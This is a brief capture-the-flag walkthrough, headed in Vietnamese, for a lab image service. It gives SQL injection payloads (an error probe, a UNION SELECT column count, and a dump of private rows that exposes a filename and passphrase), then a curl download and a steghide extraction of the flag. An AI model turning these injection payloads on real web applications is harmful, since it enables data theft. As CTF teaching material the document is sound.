# Attack

## 1. Tìm SQL Injection

Endpoint:

```text
/image?id=1
```

Thử:

```text
/image?id=1'
```

Service trả SQL error.

## 2. Xác định số cột

```text
/image?id=-1' UNION SELECT 'a','b','c'--
```

Trang render được 3 trường.

## 3. Dump record private

```text
/image?id=-1' UNION SELECT title,filename,description FROM images WHERE is_public=0--
```

Response lộ:

```text
archive_<id>.jpg
passphrase: <passphrase>
```

## 4. Tải ảnh

```bash
curl -o archive.jpg "http://target:8084/download?file=<filename>"
```

## 5. Extract flag

```bash
steghide extract -sf archive.jpg -p '<passphrase>'
cat flag.txt
```
